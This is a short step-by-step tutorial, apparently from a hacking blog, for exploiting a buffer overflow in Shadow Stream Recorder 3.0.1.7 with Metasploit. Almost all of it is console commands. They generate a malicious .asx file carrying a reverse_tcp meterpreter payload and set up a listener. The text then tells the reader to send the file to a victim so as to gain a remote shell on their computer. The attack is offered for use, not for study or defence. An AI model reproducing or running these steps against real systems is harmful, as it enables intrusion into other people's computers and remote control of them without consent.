Exploit PC in LAN using Shadow Stream Recorder 3.0.1.7 Buffer Overflow

This module exploits a buffer overflow in Shadow Stream Recorder 3.0.1.7. Using the application to open a specially crafted asx file, a buffer overflow may occur to allow arbitrary code execution under the context of the user.
Windows XP SP 3
Shadow Stream Recorder 3.0.1.7
Attacker: Backtrack 5
Victim PC: Windows XP
Open Kali Linux terminal type msfconsole

Now type use exploit/windows/fileformat/shadow_stream_recorder_bof
msf exploit (shadow_stream_recorder_bof)>set payload windows/meterpreter/reverse_tcp 
msf exploit (shadow_stream_recorder_bof)>set lhost 192.168.0.102 (IP of Local Host)
msf exploit (shadow_stream_recorder_bof)>exploit

After we successfully generate the malicious asx File, it will stored on your local computer
/root/.msf4/local/msf.asx

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.102
exploit
Now send your msf.asx files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
